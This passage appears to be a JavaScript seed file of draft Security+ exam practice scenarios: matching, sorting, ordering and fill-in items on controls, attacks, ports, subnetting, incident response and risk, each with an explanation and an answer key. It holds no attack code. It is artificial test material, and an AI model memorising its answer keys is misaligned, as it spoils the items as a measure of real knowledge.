/* DRAFT Sec+ PBQ seed scenarios — answers NOT yet founder-verified. Review before ship. */
/* Gate record, 2026-10-11 content waves (v8.156.0-v8.158.0): sp-cli-01..08, sp-dg-01..08,
   sp-wl-01..06, sp-gv-01..06, sp-th-01..04 and sp-fw-01..10 each passed simLabValidateScenario,
   their archetype's fidelity validator, and a two-reviewer gate (independent security engineer +
   CompTIA SY0-701 examiner) with every REVISE applied before merge. tests/uat/320 re-runs the
   machine half. Domain mix after the waves: D1 9% D2 14% D3 26% D4 40% D5 10% (129 seeds). */
window.SIM_LAB_SEED_SECPLUS = [
  // ===== Domain 1 — General Security Concepts (~3) =====
  {
    id: 'sp-seed-controls-cat-1', cert: 'secplus', objective: '1.1', topic: 'Security controls',
    title: 'Categorize controls by function', estMinutes: 4,
    scenario: 'Sort each security control by its control function: preventive, detective, or corrective.',
    steps: [
      { id: 's1', type: 'categorize', points: 1,
        prompt: 'Place each control under Preventive, Detective, or Corrective.',
        explanation: 'Preventive controls stop an incident before it happens (a firewall blocks traffic; a lock bars entry). Detective controls identify an incident in progress or after the fact (IDS alerts; log review). Corrective controls restore systems after an incident (restoring from backup; a patch that fixes the exploited flaw).',
        payload: {
          items: [
            { id: 'fw', label: 'Firewall rule blocking a port' },
            { id: 'lock', label: 'Door lock' },
            { id: 'ids', label: 'IDS alert on suspicious traffic' },
            { id: 'logrev', label: 'Reviewing audit logs' },
            { id: 'backup', label: 'Restoring data from backup' },
            { id: 'patch', label: 'Applying a patch after exploitation' }
          ],
          buckets: [
            { id: 'prev', label: 'Preventive' },
            { id: 'det', label: 'Detective' },
            { id: 'corr', label: 'Corrective' }
          ]
        },
        answer: { map: { fw: 'prev', lock: 'prev', ids: 'det', logrev: 'det', backup: 'corr', patch: 'corr' } } }
    ]
  },

  {
    id: 'sp-seed-control-types-cat-1', cert: 'secplus', objective: '1.1', topic: 'Security controls',
    title: 'Categorize controls by type', estMinutes: 4,
    scenario: 'SY0-701 groups controls into four types by how they are implemented: technical, managerial, operational, and physical. Sort each example.',
    steps: [
      { id: 's1', type: 'categorize', points: 1,
        prompt: 'Place each control under Technical, Managerial, Operational, or Physical.',
        explanation: 'Technical controls are implemented in technology (encryption, access control lists). Managerial controls are administrative direction (risk assessments, security policy). Operational controls are carried out by people day-to-day (security awareness training, change management). Physical controls protect the physical environment (bollards, fences, guards).',
        payload: {
          items: [
            { id: 'enc', label: 'Disk encryption' },
            { id: 'acl', label: 'Access control list' },
            { id: 'policy', label: 'Written security policy' },
            { id: 'risk', label: 'Annual risk assessment' },
            { id: 'training', label: 'Security awareness training' },
            { id: 'fence', label: 'Perimeter fence' }
          ],
          buckets: [
            { id: 'tech', label: 'Technical' },
            { id: 'mgr', label: 'Managerial' },
            { id: 'ops', label: 'Operational' },
            { id: 'phys', label: 'Physical' }
          ]
        },
        answer: { map: { enc: 'tech', acl: 'tech', policy: 'mgr', risk: 'mgr', training: 'ops', fence: 'phys' } } }
    ]
  },

  {
    id: 'sp-seed-cia-match-1', cert: 'secplus', objective: '1.2', topic: 'CIA / AAA',
    title: 'Match the foundational concept', estMinutes: 3,
    scenario: 'Match each security concept to its definition.',
    steps: [
      { id: 's1', type: 'match', points: 1,
        prompt: 'Pair each concept with its meaning.',
        explanation: 'Confidentiality keeps data secret from unauthorized parties. Integrity ensures data is not altered. Availability keeps systems and data accessible. Non-repudiation proves an action cannot be denied by its actor (e.g., a digital signature). Authentication proves identity.',
        payload: {
          left: [
            { id: 'conf', label: 'Confidentiality' },
            { id: 'integ', label: 'Integrity' },
            { id: 'avail', label: 'Availability' },
            { id: 'nonrep', label: 'Non-repudiation' },
            { id: 'authn', label: 'Authentication' }
          ],
          right: [
            { id: 'dsecret', label: 'Keeps data secret from unauthorized parties' },
            { id: 'dunaltered', label: 'Ensures data has not been altered' },
            { id: 'daccess', label: 'Keeps systems and data accessible' },
            { id: 'ddeny', label: 'Proves an action cannot be denied by its actor' },
            { id: 'dident', label: 'Proves a claimed identity' }
          ]
        },
        answer: { pairs: { conf: 'dsecret', integ: 'dunaltered', avail: 'daccess', nonrep: 'ddeny', authn: 'dident' } } }
    ]
  },

  // ===== Domain 2 — Threats, Vulnerabilities & Mitigations (~6) =====
  {
    id: 'sp-seed-social-attacks-match-1', cert: 'secplus', objective: '2.2', topic: 'Social engineering',
    title: 'Match the social-engineering attack', estMinutes: 4,
    scenario: 'Match each social-engineering technique to its description.',
    steps: [
      { id: 's1', type: 'match', points: 1,
        prompt: 'Pair each attack with how it is delivered.',
        explanation: 'Phishing uses fraudulent email. Smishing uses SMS/text messages. Vishing uses voice calls. A watering-hole attack compromises a website the target group is known to visit. Whaling is phishing aimed at a high-value executive.',
        payload: {
          left: [
            { id: 'phish', label: 'Phishing' },
            { id: 'smish', label: 'Smishing' },
            { id: 'vish', label: 'Vishing' },
            { id: 'water', label: 'Watering hole' },
            { id: 'whale', label: 'Whaling' }
          ],
          right: [
            { id: 'demail', label: 'Fraudulent email to many users' },
            { id: 'dsms', label: 'Fraudulent SMS / text message' },
            { id: 'dvoice', label: 'Fraudulent voice phone call' },
            { id: 'dsite', label: 'Compromising a site the target group visits' },
            { id: 'dexec', label: 'Phishing aimed at a senior executive' }
          ]
        },
        answer: { pairs: { phish: 'demail', smish: 'dsms', vish: 'dvoice', water: 'dsite', whale: 'dexec' } } }
    ]
  },

  {
    id: 'sp-seed-malware-match-1', cert: 'secplus', objective: '2.4', topic: 'Malware',
    title: 'Match the malware type', estMinutes: 4,
    scenario: 'Match each malware type to its defining behavior.',
    steps: [
      { id: 's1', type: 'match', points: 1,
        prompt: 'Pair each malware type with its behavior.',
        explanation: 'A worm self-replicates and spreads across a network without user action. A Trojan hides inside a seemingly legitimate program. Ransomware encrypts files and demands payment. A rootkit hides itself and grants privileged access. A keylogger records keystrokes to steal credentials.',
        payload: {
          left: [
            { id: 'worm', label: 'Worm' },
            { id: 'trojan', label: 'Trojan' },
            { id: 'ransom', label: 'Ransomware' },
            { id: 'rootkit', label: 'Rootkit' },
            { id: 'keylog', label: 'Keylogger' }
          ],
          right: [
            { id: 'dspread', label: 'Self-replicates across a network without user action' },
            { id: 'dhide', label: 'Hides inside a seemingly legitimate program' },
            { id: 'dencrypt', label: 'Encrypts files and demands payment' },
            { id: 'dconceal', label: 'Conceals itself and grants privileged access' },
            { id: 'dkeys', label: 'Records keystrokes to steal credentials' }
          ]
        },
        answer: { pairs: { worm: 'dspread', trojan: 'dhide', ransom: 'dencrypt', rootkit: 'dconceal', keylog: 'dkeys' } } }
    ]
  },

  {
    id: 'sp-seed-appattacks-match-1', cert: 'secplus', objective: '2.3', topic: 'Application attacks',
    title: 'Match the application attack', estMinutes: 4,
    scenario: 'Match each application/web attack to its description.',
    steps: [
      { id: 's1', type: 'match', points: 1,
        prompt: 'Pair each attack with what it does.',
        explanation: 'SQL injection inserts malicious SQL into an input to manipulate the database. XSS injects script that runs in another user’s browser. CSRF tricks an authenticated user’s browser into sending an unwanted request. A buffer overflow writes past a memory boundary to corrupt execution. Privilege escalation gains rights beyond those assigned.',
        payload: {
          left: [
            { id: 'sqli', label: 'SQL injection' },
            { id: 'xss', label: 'Cross-site scripting (XSS)' },
            { id: 'csrf', label: 'Cross-site request forgery (CSRF)' },
            { id: 'bof', label: 'Buffer overflow' },
            { id: 'privesc', label: 'Privilege escalation' }
          ],
          right: [
            { id: 'ddb', label: 'Inserts malicious SQL to manipulate the database' },
            { id: 'dscript', label: 'Injects script that runs in another user’s browser' },
            { id: 'dforge', label: 'Forces an authenticated browser to send an unwanted request' },
            { id: 'dmem', label: 'Writes past a memory boundary to corrupt execution' },
            { id: 'drights', label: 'Gains rights beyond those assigned' }
          ]
        },
        answer: { pairs: { sqli: 'ddb', xss: 'dscript', csrf: 'dforge', bof: 'dmem', privesc: 'drights' } } }
    ]
  },

  {
    id: 'sp-seed-threat-actors-match-1', cert: 'secplus', objective: '2.1', topic: 'Threat actors',
    title: 'Match the threat actor', estMinutes: 3,
    scenario: 'Match each threat actor to its primary motivation or trait.',
    steps: [
      { id: 's1', type: 'match', points: 1,
        prompt: 'Pair each threat actor with its defining trait.',
        explanation: 'A nation-state actor is highly resourced and pursues espionage or strategic goals (often an APT). A hacktivist is driven by a political or social cause. An organized-crime group is motivated by financial gain. An insider threat originates from someone with legitimate access. An unskilled attacker (script kiddie) uses existing tools without deep expertise.',
        payload: {
          left: [
            { id: 'nation', label: 'Nation-state' },
            { id: 'hack', label: 'Hacktivist' },
            { id: 'crime', label: 'Organized crime' },
            { id: 'insider', label: 'Insider threat' },
            { id: 'script', label: 'Unskilled attacker' }
          ],
          right: [
            { id: 'despionage', label: 'Highly resourced; espionage / strategic goals' },
            { id: 'dcause', label: 'Driven by a political or social cause' },
            { id: 'dmoney', label: 'Motivated primarily by financial gain' },
            { id: 'daccess', label: 'Originates from someone with legitimate access' },
            { id: 'dtools', label: 'Uses existing tools without deep expertise' }
          ]
        },
        answer: { pairs: { nation: 'despionage', hack: 'dcause', crime: 'dmoney', insider: 'daccess', script: 'dtools' } } }
    ]
  },

  {
    id: 'sp-seed-vuln-scan-analyze-1', cert: 'secplus', objective: '4.3', topic: 'Vulnerability management',
    title: 'Read the vulnerability scan', estMinutes: 3,
    scenario: 'A vulnerability scanner returned the findings below for one host. Click the single finding that should be remediated first.',
    steps: [
      { id: 's1', type: 'analyze', points: 1,
        prompt: 'Select the finding with the highest remediation priority.',
        explanation: 'CVSS scores run 0–10; 9.0–10.0 is Critical. The unauthenticated remote code execution at CVSS 9.8 is the most severe and is remotely exploitable without credentials, so it is remediated first.',
        payload: {
          multi: false,
          lines: [
            { id: 'l1', text: 'CVE-2024-1001  TLS 1.0 enabled            CVSS 5.3 (Medium)' },
            { id: 'l2', text: 'CVE-2024-1002  Unauth. remote code execution CVSS 9.8 (Critical)' },
            { id: 'l3', text: 'CVE-2024-1003  Verbose error messages       CVSS 3.1 (Low)' },
            { id: 'l4', text: 'CVE-2024-1004  Missing HTTP security header  CVSS 4.0 (Medium)' }
          ]
        },
        answer: { selected: ['l2'] } }
    ]
  },

  {
    id: 'sp-seed-passwordattacks-cat-1', cert: 'secplus', objective: '2.4', topic: 'Password attacks',
    title: 'Classify the password attack', estMinutes: 3,
    scenario: 'Sort each password-cracking approach into brute-force, dictionary, or hybrid/other.',
    steps: [
      { id: 's1', type: 'categorize', points: 1,
        prompt: 'Place each technique under its category.',
        explanation: 'Brute force tries every possible combination. A dictionary attack tries words from a list. A rainbow-table attack uses precomputed hash lookups, and password spraying tries one common password across many accounts — both are distinct from pure brute force and dictionary.',
        payload: {
          items: [
            { id: 'allcombo', label: 'Trying every possible character combination' },
            { id: 'wordlist', label: 'Trying words from a wordlist' },
            { id: 'rainbow', label: 'Looking up precomputed hash values' },
            { id: 'spray', label: 'Trying one common password across many accounts' }
          ],
          buckets: [
            { id: 'brute', label: 'Brute force' },
            { id: 'dict', label: 'Dictionary' },
            { id: 'other', label: 'Other technique' }
          ]
        },
        answer: { map: { allcombo: 'brute', wordlist: 'dict', rainbow: 'other', spray: 'other' } } }
    ]
  },

  // ===== Domain 3 — Security Architecture (~4) =====
  {
    id: 'sp-seed-crypto-match-1', cert: 'secplus', objective: '1.4', topic: 'Cryptography',
    title: 'Match the cryptographic primitive', estMinutes: 4,
    scenario: 'Match each algorithm to its cryptographic category.',
    steps: [
      { id: 's1', type: 'match', points: 1,
        prompt: 'Pair each algorithm with its category.',
        explanation: 'AES is a symmetric block cipher (one shared key). RSA is asymmetric (public/private key pair). SHA-256 is a hashing algorithm (one-way digest). HMAC provides message integrity and authenticity using a hash plus a secret key. ECC is asymmetric cryptography based on elliptic curves.',
        payload: {
          left: [
            { id: 'aes', label: 'AES' },
            { id: 'rsa', label: 'RSA' },
            { id: 'sha', label: 'SHA-256' },
            { id: 'hmac', label: 'HMAC' },
            { id: 'ecc', label: 'ECC' }
          ],
          right: [
            { id: 'dsym', label: 'Symmetric encryption' },
            { id: 'dasym', label: 'Asymmetric encryption' },
            { id: 'dhash', label: 'Hashing (one-way digest)' },
            { id: 'dintegrity', label: 'Keyed message integrity / authenticity' },
            { id: 'dcurve', label: 'Asymmetric cryptography on elliptic curves' }
          ]
        },
        answer: { pairs: { aes: 'dsym', rsa: 'dasym', sha: 'dhash', hmac: 'dintegrity', ecc: 'dcurve' } } }
    ]
  },

  {
    id: 'sp-seed-secureports-match-1', cert: 'secplus', objective: '4.5', topic: 'Secure protocols',
    title: 'Match secure protocol to port', estMinutes: 4,
    scenario: 'Match each secure protocol to the TCP port it uses by default.',
    steps: [
      { id: 's1', type: 'match', points: 1,
        prompt: 'Pair each secure protocol with its default port.',
        explanation: 'HTTPS uses 443. SFTP runs over SSH on port 22. FTPS (implicit) uses 990. LDAPS uses 636. SNMPv3 uses 161 (the same port as earlier SNMP versions; the version, not the port, adds security).',
        payload: {
          left: [
            { id: 'https', label: 'HTTPS' },
            { id: 'sftp', label: 'SFTP' },
            { id: 'ftps', label: 'FTPS (implicit)' },
            { id: 'ldaps', label: 'LDAPS' },
            { id: 'snmp3', label: 'SNMPv3' }
          ],
          right: [
            { id: 'p443', label: '443' },
            { id: 'p22', label: '22' },
            { id: 'p990', label: '990' },
            { id: 'p636', label: '636' },
            { id: 'p161', label: '161' }
          ]
        },
        // Reviewed (security-eng + CompTIA examiner): implicit-FTPS control port 990 confirmed correct; 989 (data) is not an option here, so no ambiguity.
        answer: { pairs: { https: 'p443', sftp: 'p22', ftps: 'p990', ldaps: 'p636', snmp3: 'p161' } } }
    ]
  },

  {
    id: 'sp-seed-dmz-fillin-1', cert: 'secplus', objective: '3.1', topic: 'Network segmentation',
    title: 'Size the DMZ subnet', estMinutes: 5,
    scenario: 'You are carving a screened subnet (DMZ) out of 10.10.20.0 to host up to 12 public-facing servers. Answer both fields.',
    steps: [
      { id: 's1', type: 'fillin', points: 1,
        prompt: 'What is the smallest CIDR prefix that provides at least 12 usable host addresses?',
        explanation: 'A /28 yields 16 addresses, 14 usable (2^4 - 2) — the smallest block that fits 12 hosts. A /29 gives only 6 usable, which is too few.',
        payload: { fields: [{ id: 'cidr', label: 'CIDR prefix', inputmode: 'text' }] },
        answer: { cidr: ['/28', '28'] } },
      { id: 's2', type: 'fillin', points: 1,
        prompt: 'How many usable host addresses does that prefix provide?',
        explanation: '2^4 - 2 = 14 usable addresses (minus the network and broadcast addresses).',
        payload: { fields: [{ id: 'hosts', label: 'Usable hosts', inputmode: 'numeric' }] },
        answer: { hosts: ['14'] } }
    ]
  },

  {
    id: 'sp-seed-pki-order-1', cert: 'secplus', objective: '1.4', topic: 'PKI',
    title: 'Order the certificate issuance flow', estMinutes: 4,
    scenario: 'A web server operator obtains a TLS certificate from a CA. Put the PKI issuance steps in order, first step at the top.',
    steps: [
      { id: 's1', type: 'order', points: 1,
        prompt: 'Arrange the certificate issuance steps in order.',
        explanation: 'The operator generates a key pair, builds a Certificate Signing Request (CSR) containing the public key, submits it to the CA, the CA validates the requester and signs the certificate, then the operator installs the signed certificate on the server.',
        payload: { items: [
          { id: 'submit', label: 'Submit the CSR to the Certificate Authority' },
          { id: 'keygen', label: 'Generate the public/private key pair' },
          { id: 'install', label: 'Install the signed certificate on the server' },
          { id: 'csr', label: 'Create the Certificate Signing Request (CSR)' },
          { id: 'sign', label: 'CA validates the requester and signs the certificate' }
        ] },
        answer: { correctOrder: ['keygen', 'csr', 'submit', 'sign', 'install'] } }
    ]
  },

  // ===== Domain 4 — Security Operations (~7) =====
  {
    id: 'sp-seed-ir-order-1', cert: 'secplus', objective: '4.8', topic: 'Incident response',
    title: 'Order the incident-response lifecycle', estMinutes: 4,
    scenario: 'Your team handles a confirmed breach. Put the incident-response phases in the order SY0-701 defines, first phase at the top.',
    steps: [
      { id: 's1', type: 'order', points: 1,
        prompt: 'Arrange the incident-response phases in order.',
        explanation: 'SY0-701 order: Preparation, Detection, Analysis, Containment, Eradication, Recovery, Lessons Learned. Preparation comes first; Lessons Learned closes the loop.',
        payload: { items: [
          { id: 'contain', label: 'Containment' },
          { id: 'prep', label: 'Preparation' },
          { id: 'lessons', label: 'Lessons Learned' },
          { id: 'detect', label: 'Detection' },
          { id: 'recover', label: 'Recovery' },
          { id: 'analyze', label: 'Analysis' },
          { id: 'eradicate', label: 'Eradication' }
        ] },
        // Reviewed (security-eng + CompTIA examiner): SY0-701 4.8 canonical 7-phase order confirmed; keep Detection and Analysis as separate phases.
        answer: { correctOrder: ['prep', 'detect', 'analyze', 'contain', 'eradicate', 'recover', 'lessons'] } }
    ]
  },

  {
    id: 'sp-seed-log-cat-1', cert: 'secplus', objective: '4.9', topic: 'Log analysis',
    title: 'Categorize the log source', estMinutes: 4,
    scenario: 'Sort each log entry by the source that most likely produced it.',
    steps: [
      { id: 's1', type: 'categorize', points: 1,
        prompt: 'Place each entry under Firewall, Authentication, or Web server.',
        explanation: 'A DENY on a source/destination IP and port is a firewall log. A failed/successful login for a user account is an authentication log. An HTTP method with a status code (GET / 200, POST / 401) is a web-server access log.',
        payload: {
          items: [
            { id: 'deny', label: 'DENY src=203.0.113.5 dst=10.0.0.8:3389' },
            { id: 'login', label: 'Failed password for user jdoe from 10.0.0.20' },
            { id: 'http', label: '"GET /login HTTP/1.1" 200 1340' },
            { id: 'accept', label: 'ALLOW src=10.0.0.5 dst=10.0.0.9:443' },
            { id: 'success', label: 'Accepted password for user admin from 10.0.0.7' },
            { id: 'post', label: '"POST /admin HTTP/1.1" 403 512' }
          ],
          buckets: [
            { id: 'fw', label: 'Firewall' },
            { id: 'auth', label: 'Authentication' },
            { id: 'web', label: 'Web server' }
          ]
        },
        answer: { map: { deny: 'fw', login: 'auth', http: 'web', accept: 'fw', success: 'auth', post: 'web' } } }
    ]
  },

  {
    id: 'sp-seed-scan-output-analyze-1', cert: 'secplus', objective: '4.3', topic: 'Security tooling',
    title: 'Port scan vs vulnerability scan', estMinutes: 3,
    scenario: 'Two tool outputs are shown. Click the single output that is from a port scan (not a vulnerability scan).',
    steps: [
      { id: 's1', type: 'analyze', points: 1,
        prompt: 'Select the line that represents port-scan output.',
        explanation: 'A port scan reports open ports and the service/state on each (e.g., "443/tcp open https"). A vulnerability scan reports named weaknesses with severity (CVE + CVSS). The bare open-port/state line is the port-scan output.',
        payload: {
          multi: false,
          lines: [
            { id: 'l1', text: '443/tcp  open  https' },
            { id: 'l2', text: 'CVE-2023-4567  Outdated OpenSSL  CVSS 7.5 (High)' },
            { id: 'l3', text: 'Plugin: Weak cipher suites detected (Medium)' },
            { id: 'l4', text: 'Finding: Default credentials in use (Critical)' }
          ]
        },
        answer: { selected: ['l1'] } }
    ]
  },

  {
    id: 'sp-seed-iam-match-1', cert: 'secplus', objective: '4.6', topic: 'Identity and access',
    title: 'Match the IAM concept', estMinutes: 4,
    scenario: 'Match each identity and access-management concept to its definition.',
    steps: [
      { id: 's1', type: 'match', points: 1,
        prompt: 'Pair each concept with its meaning.',
        explanation: 'Authentication proves who you are. Authorization decides what you can access. Accounting (auditing) records what you did. SSO lets one login grant access to many systems. MFA requires two or more distinct factors.',
        payload: {
          left: [
            { id: 'authn', label: 'Authentication' },
            { id: 'authz', label: 'Authorization' },
            { id: 'acct', label: 'Accounting' },
            { id: 'sso', label: 'Single sign-on (SSO)' },
            { id: 'mfa', label: 'Multifactor authentication (MFA)' }
          ],
          right: [
            { id: 'dwho', label: 'Proves who you are' },
            { id: 'dwhat', label: 'Decides what you are allowed to access' },
            { id: 'ddid', label: 'Records what you did' },
            { id: 'dmany', label: 'One login grants access to many systems' },
            { id: 'dfactors', label: 'Requires two or more distinct factors' }
          ]
        },
        answer: { pairs: { authn: 'dwho', authz: 'dwhat', acct: 'ddid', sso: 'dmany', mfa: 'dfactors' } } }
    ]
  },

  {
    id: 'sp-seed-mfa-factors-cat-1', cert: 'secplus', objective: '4.6', topic: 'Authentication factors',
    title: 'Classify the authentication factor', estMinutes: 3,
    scenario: 'Sort each authenticator by the factor category it belongs to.',
    steps: [
      { id: 's1', type: 'categorize', points: 1,
        prompt: 'Place each item under Something you know, Something you have, or Something you are.',
        explanation: 'A password or PIN is something you know. A hardware token or smartphone authenticator app is something you have. A fingerprint or retina scan is something you are (biometric).',
        payload: {
          items: [
            { id: 'pwd', label: 'Password' },
            { id: 'pin', label: 'PIN' },
            { id: 'token', label: 'Hardware security token' },
            { id: 'app', label: 'Authenticator app on a phone' },
            { id: 'finger', label: 'Fingerprint' },
            { id: 'retina', label: 'Retina scan' }
          ],
          buckets: [
            { id: 'know', label: 'Something you know' },
            { id: 'have', label: 'Something you have' },
            { id: 'are', label: 'Something you are' }
          ]
        },
        answer: { map: { pwd: 'know', pin: 'know', token: 'have', app: 'have', finger: 'are', retina: 'are' } } }
    ]
  },

  {
    id: 'sp-seed-firewall-analyze-1', cert: 'secplus', objective: '4.5', topic: 'Firewall rules',
    title: 'Find the overly permissive rule', estMinutes: 3,
    scenario: 'A firewall rule set is shown. Click the single rule that is the most dangerously permissive.',
    steps: [
      { id: 's1', type: 'analyze', points: 1,
        prompt: 'Select the most dangerously permissive rule.',
        explanation: 'A rule that allows ANY source to ANY destination on ANY port violates least privilege and effectively disables the firewall. The other rules scope source, destination, and port narrowly.',
        payload: {
          multi: false,
          lines: [
            { id: 'l1', text: 'ALLOW src=10.0.1.0/24 dst=10.0.2.10 port=443' },
            { id: 'l2', text: 'ALLOW src=ANY dst=ANY port=ANY' },
            { id: 'l3', text: 'ALLOW src=10.0.1.5 dst=10.0.2.20 port=22' },
            { id: 'l4', text: 'DENY  src=ANY dst=10.0.3.0/24 port=ANY' }
          ]
        },
        answer: { selected: ['l2'] } }
    ]
  },

  {
    id: 'sp-seed-backup-cat-1', cert: 'secplus', objective: '3.4', topic: 'Resilience and backups',
    title: 'Classify the backup type', estMinutes: 3,
    scenario: 'Sort each backup behavior into full, incremental, or differential.',
    steps: [
      { id: 's1', type: 'categorize', points: 1,
        prompt: 'Place each description under Full, Incremental, or Differential.',
        explanation: 'A full backup copies all selected data. An incremental backup copies only data changed since the last backup of any type (full or incremental). A differential backup copies all data changed since the last full backup, so it grows each day until the next full.',
        payload: {
          items: [
            { id: 'all', label: 'Copies all selected data every time' },
            { id: 'sincelast', label: 'Copies only data changed since the last backup of any type' },
            { id: 'sincefull', label: 'Copies all data changed since the last full backup' }
          ],
          buckets: [
            { id: 'full', label: 'Full' },
            { id: 'incr', label: 'Incremental' },
            { id: 'diff', label: 'Differential' }
          ]
        },
        answer: { map: { all: 'full', sincelast: 'incr', sincefull: 'diff' } } }
    ]
  },

  // ===== Domain 5 — Security Program Management & Oversight (~4) =====
  {
    id: 'sp-seed-risk-treatment-match-1', cert: 'secplus', objective: '5.2', topic: 'Risk management',
    title: 'Match the risk-treatment strategy', estMinutes: 4,
    scenario: 'Match each risk-treatment response to the action that represents it.',
    steps: [
      { id: 's1', type: 'match', points: 1,
        prompt: 'Pair each strategy with the action that represents it.',
        explanation: 'Mitigate (reduce) lowers likelihood or impact with a control. Transfer shifts the risk to a third party, e.g., insurance. Avoid stops the risky activity entirely. Accept acknowledges the risk and takes no further action.',
        payload: {
          left: [
            { id: 'mitigate', label: 'Mitigate' },
            { id: 'transfer', label: 'Transfer' },
            { id: 'avoid', label: 'Avoid' },
            { id: 'accept', label: 'Accept' }
          ],
          right: [
            { id: 'dcontrol', label: 'Deploy a control to reduce likelihood or impact' },
            { id: 'dinsure', label: 'Buy cyber-insurance to shift the loss to an insurer' },
            { id: 'dstop', label: 'Discontinue the risky activity entirely' },
            { id: 'dnoaction', label: 'Acknowledge the risk and take no further action' }
          ]
        },
        answer: { pairs: { mitigate: 'dcontrol', transfer: 'dinsure', avoid: 'dstop', accept: 'dnoaction' } } }
    ]
  },

  {
    id: 'sp-seed-agreements-match-1', cert: 'secplus', objective: '5.3', topic: 'Vendor agreements',
    title: 'Match the agreement type', estMinutes: 4,
    scenario: 'Match each third-party agreement acronym to its purpose.',
    steps: [
      { id: 's1', type: 'match', points: 1,
        prompt: 'Pair each agreement with its purpose.',
        explanation: 'An SLA defines the measurable service levels a provider must meet. An MOU is a non-binding statement of intent between parties. An NDA legally protects shared confidential information. A BPA governs a business partnership. An MSA sets the overarching terms for future contracts.',
        payload: {
          left: [
            { id: 'sla', label: 'SLA' },
            { id: 'mou', label: 'MOU' },
            { id: 'nda', label: 'NDA' },
            { id: 'bpa', label: 'BPA' },
            { id: 'msa', label: 'MSA' }
          ],
          right: [
            { id: 'dlevels', label: 'Defines measurable service levels to be met' },
            { id: 'dintent', label: 'Non-binding statement of intent between parties' },
            { id: 'dconfid', label: 'Legally protects shared confidential information' },
            { id: 'dpartner', label: 'Governs a business partnership' },
            { id: 'dmaster', label: 'Sets overarching terms for future contracts' }
          ]
        },
        answer: { pairs: { sla: 'dlevels', mou: 'dintent', nda: 'dconfid', bpa: 'dpartner', msa: 'dmaster' } } }
    ]
  },

  {
    id: 'sp-seed-data-roles-match-1', cert: 'secplus', objective: '5.1', topic: 'Data governance',
    title: 'Match the data-governance role', estMinutes: 3,
    scenario: 'Match each data-governance role to its responsibility.',
    steps: [
      { id: 's1', type: 'match', points: 1,
        prompt: 'Pair each role with its responsibility.',
        explanation: 'The data owner is accountable for the data and sets its classification. The data controller determines the purposes and means of processing. The data processor processes data on behalf of the controller. The data custodian implements the technical handling and protection. The data steward manages day-to-day data quality and policy compliance.',
        payload: {
          left: [
            { id: 'owner', label: 'Data owner' },
            { id: 'controller', label: 'Data controller' },
            { id: 'processor', label: 'Data processor' },
            { id: 'custodian', label: 'Data custodian' },
            { id: 'steward', label: 'Data steward' }
          ],
          right: [
            { id: 'daccount', label: 'Accountable for the data; sets classification' },
            { id: 'dpurpose', label: 'Determines the purposes and means of processing' },
            { id: 'dbehalf', label: 'Processes data on behalf of the controller' },
            { id: 'dtech', label: 'Implements technical handling and protection' },
            { id: 'dquality', label: 'Manages day-to-day data quality and compliance' }
          ]
        },
        // Reviewed (security-eng + CompTIA examiner): SY0-701 split confirmed — custodian = technical handling, steward = data quality/policy; mapping is exam-safe.
        answer: { pairs: { owner: 'daccount', controller: 'dpurpose', processor: 'dbehalf', custodian: 'dtech', steward: 'dquality' } } }
    ]
  },

  {
    id: 'sp-seed-bcdr-fillin-1', cert: 'secplus', objective: '3.4', topic: 'BC/DR metrics',
    title: 'Recovery objectives and SLE', estMinutes: 4,
    scenario: 'A business-impact analysis asks you to define two recovery metrics and compute one risk figure. Answer all fields.',
    steps: [
      { id: 's1', type: 'fillin', points: 1,
        prompt: 'What metric defines the maximum acceptable downtime before a process must be restored? (acronym)',
        explanation: 'RTO (Recovery Time Objective) is the maximum tolerable time to restore a service after an outage.',
        payload: { fields: [{ id: 'rto', label: 'Acronym', inputmode: 'text' }] },
        answer: { rto: ['RTO', 'recovery time objective'] } },
      { id: 's2', type: 'fillin', points: 1,
        prompt: 'What metric defines the maximum acceptable amount of data loss measured in time? (acronym)',
        explanation: 'RPO (Recovery Point Objective) is the maximum amount of data, measured in time, that can be lost — it drives backup frequency.',
        payload: { fields: [{ id: 'rpo', label: 'Acronym', inputmode: 'text' }] },
        answer: { rpo: ['RPO', 'recovery point objective'] } },
      { id: 's3', type: 'fillin', points: 1,
        prompt: 'An asset is valued at $50,000 and an incident would destroy 40% of its value. What is the single loss expectancy (SLE) in dollars?',
        explanation: 'SLE = Asset Value × Exposure Factor = $50,000 × 0.40 = $20,000.',
        payload: { fields: [{ id: 'sle', label: 'SLE (USD)', inputmode: 'numeric' }] },
        answer: { sle: ['20000', '$20000', '20,000', '$20,000'] } }
    ]
  },

  // ========================================================================
  // ===== APPENDED 26 NEW SCENARIOS (DRAFT — founder verification) ==========
  // ========================================================================

  // ===== Domain 1 — General Security Concepts (+2) =====
  {
    id: 'sp-seed-zerotrust-match-1', cert: 'secplus', objective: '1.2', topic: 'Zero Trust',
    title: 'Match the Zero Trust component', estMinutes: 4,
    scenario: 'SY0-701 splits Zero Trust into a Control Plane and a Data Plane. Match each Zero Trust component to its role.',
    steps: [
      { id: 's1', type: 'match', points: 1,
        prompt: 'Pair each Zero Trust component with its function.',
        explanation: 'The Policy Engine decides whether to grant access using policy and signals. The Policy Administrator establishes or terminates the connection based on that decision. The Policy Enforcement Point (PEP) is the gateway that enforces the decision on the data plane. Adaptive identity adjusts trust based on context (location, device, behavior).',
        payload: {
          left: [
            { id: 'pe', label: 'Policy Engine' },
            { id: 'pa', label: 'Policy Administrator' },
            { id: 'pep', label: 'Policy Enforcement Point' },
            { id: 'adapt', label: 'Adaptive identity' }
          ],
          right: [
            { id: 'ddecide', label: 'Decides to grant access using policy and signals' },
            { id: 'dconnect', label: 'Establishes or terminates the connection per the decision' },
            { id: 'dgateway', label: 'Gateway that enforces the decision on the data plane' },
            { id: 'dcontext', label: 'Adjusts trust based on context such as location or device' }
          ]
        },
        answer: { pairs: { pe: 'ddecide', pa: 'dconnect', pep: 'dgateway', adapt: 'dcontext' } } }
    ]
  },

  {
    id: 'sp-seed-deception-cat-1', cert: 'secplus', objective: '1.2', topic: 'Deception technology',
    title: 'Classify the deception technique', estMinutes: 3,
    scenario: 'Sort each deception/disruption technology by what it actually is.',
    steps: [
      { id: 's1', type: 'categorize', points: 1,
        prompt: 'Place each item under Single decoy, Decoy network, or Bait data.',
        explanation: 'A honeypot is a single decoy host that lures and observes attackers. A honeynet is a network of honeypots that mimics a real environment. A honeyfile is bait data — a tempting file that should never be opened. A honeytoken is bait data too — a fake credential or record that signals misuse when used.',
        payload: {
          items: [
            { id: 'hpot', label: 'Honeypot' },
            { id: 'hnet', label: 'Honeynet' },
            { id: 'hfile', label: 'Honeyfile' },
            { id: 'htoken', label: 'Honeytoken' }
          ],
          buckets: [
            { id: 'decoy1', label: 'Single decoy host' },
